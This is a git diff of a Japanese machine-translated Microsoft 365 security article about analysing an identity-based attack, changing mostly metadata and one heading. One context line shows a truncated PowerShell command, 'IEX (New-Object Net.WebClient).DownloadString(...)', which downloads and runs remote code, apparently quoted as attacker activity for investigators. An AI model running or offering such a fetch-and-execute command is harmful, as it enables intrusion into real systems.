@@ -3,7 +3,8 @@ title: ID ベースの攻撃の例
 description: ID ベースの攻撃の分析の例を示します。
 keywords: インシデント, アラート, 調査, 相関関係, 攻撃, マシン, デバイス, ユーザー, ID, ID, メールボックス, 電子メール, 365, microsoft, m365, インシデント対応, サイバー攻撃
 search.product: eADQiWindows 10XVcnh
-ms.prod: m365-security
+ms.service: microsoft-365-security
+ms.subservice: m365d
 ms.mktglfcycl: deploy
 ms.sitesec: library
 ms.pagetype: security
@@ -17,17 +18,17 @@ audience: ITPro
 ms.collection:
 - M365-security-compliance
 - m365solution-firstincident
+- highpri
 ms.topic: conceptual
 search.appverid:
 - MOE150
 - MET150
-ms.technology: m365d
-ms.openlocfilehash: 2e0b237ad045b98b2bb013399f344db3f20f1919
-ms.sourcegitcommit: c1eaea74c8ffce2f9f477c9469342e88e4a70c14
+ms.openlocfilehash: c96e9bef376ad7f36386e8aed78b97cd01332805
+ms.sourcegitcommit: 10e6abe740e27000e223378eb17d657a47555fa8
 ms.translationtype: MT
 ms.contentlocale: ja-JP
-ms.lasthandoff: 07/20/2022
-ms.locfileid: "66893619"
+ms.lasthandoff: 08/31/2022
+ms.locfileid: "67480298"
 ---
 # <a name="example-of-an-identity-based-attack"></a>ID ベースの攻撃の例
 
@@ -87,7 +88,7 @@ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
 ```
 アナリストは、検索バーにキーワードを入力してキーワードをすばやく検索し、PowerShell で作成されたイベントのみを表示できます。 
 
-## <a name="next-step"></a>次の手順
+## <a name="next-step"></a>次のステップ
 
 フィッシング調査パス [を](first-incident-path-phishing.md) 参照してください。
 
